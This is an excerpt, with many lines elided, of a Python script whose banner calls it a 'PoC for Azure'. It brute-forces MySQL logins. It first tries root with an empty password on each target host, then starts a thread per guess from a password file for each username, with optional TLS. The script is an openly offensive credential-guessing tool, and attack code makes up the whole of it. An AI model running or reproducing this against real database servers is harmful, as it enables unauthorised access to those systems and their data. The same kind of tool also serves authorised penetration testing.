...
# Show script banner.
def showBanner():
    print("\n\033[1;1m PoC for Azure ---- Service ")
    print("\033[1;95m-----> \" written by Mehrnoush \" <-----\033[0;m ", end="")
    print("(v{})\n".format(getVersion()))
...
def connect(host, user, password, port, timeout, use_tls, tls_cert):
    ...
    try:
        ...
        conn_args = {
            ...
            'ssl': {'ca': tls_cert, 'ssl_verify_cert': True} if use_tls else None
        }
        MySQLdb.connect(**conn_args)
        success = True
...
def main(args, users, hosts):
    try:
        ...
        del args.port, args.timeout, args.threads, args.tls, args.tls_cert
        for host in hosts:
            ...
            connect(host, "root", "", port, timeout, use_tls, tls_cert)
            ...
            for user in users:
                ...
                with open(args.passwords) as file:
                    for password in file:
                        if success:
                            break
                        th = Thread(target=connect, args=(host, user, password.strip(), port, timeout, use_tls, tls_cert))
                        th.daemon = True
                        th.start()
...
if __name__ == "__main__":
    try:
        ...
        args.add_argument("--tls", dest="tls", action="store_true", help="use TLS for connection")
        args.add_argument("--tls-cert", dest="tls_cert", type=str, help="path to TLS certificate file")
